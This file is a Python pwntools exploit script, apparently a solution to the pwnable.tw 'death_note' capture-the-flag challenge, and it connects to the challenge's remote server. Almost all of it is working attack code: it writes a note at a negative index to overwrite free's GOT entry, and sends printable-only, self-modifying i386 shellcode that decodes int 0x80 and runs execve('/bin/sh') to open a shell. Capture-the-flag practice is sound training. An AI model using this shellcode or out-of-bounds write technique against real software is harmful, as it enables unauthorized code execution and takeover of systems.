#!/usr/bin/env python

from pwn import *

context.update(log_level='debug', arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])

#p = process('./death_note')
p = remote('chall.pwnable.tw', 10201)

Debug = False
if Debug:
    gdb.attach(p, '''
        break free@plt
        continue
    ''')

def add_note(idx, name):
    p.sendlineafter('Your choice :', '1')
    p.sendlineafter('Index :', str(idx))
    p.sendlineafter('Name :', name)

def del_note(idx):
    p.sendlineafter('Your choice :', '3')
    p.sendlineafter('Index :', str(idx))

exp = asm('''
/*
when execute
EAX  input buffer address
EBX  0x0
ECX  0x0
EDX  0x0
*/
/* execve(path='/bin///sh', argv=0, envp=0) */

/* self modify code to generate int 0x80 */
dec edx
dec edx /* set dl = 0xfe */
xor [eax+33], dl /* decode int 0xcd */
xor [eax+34], dl /* decode int 0x80 */
inc edx
inc edx

/* push '/bin///sh\x00' */
push 0x68
push 0x732f2f2f
push 0x6e69622f
push esp
pop ebx

/* nop */
inc edx
dec edx
inc edx
dec edx


/* ecx already = 0 */
/* edx already = 0 */

/* set eax = 0xb(SYS_execve)*/
push 0x40
pop eax
xor al,0x4b

/* int 0x80 */
''') + '\x33\x7e'


print('exp length = ' + str(len(exp)))
for c in exp:
    n = ord(c)
    if n <= 0x1f or n >= 0x7f:
        print('invalid char: ' + c)


add_note(-19, exp)
del_note(-19)

p.interactive()
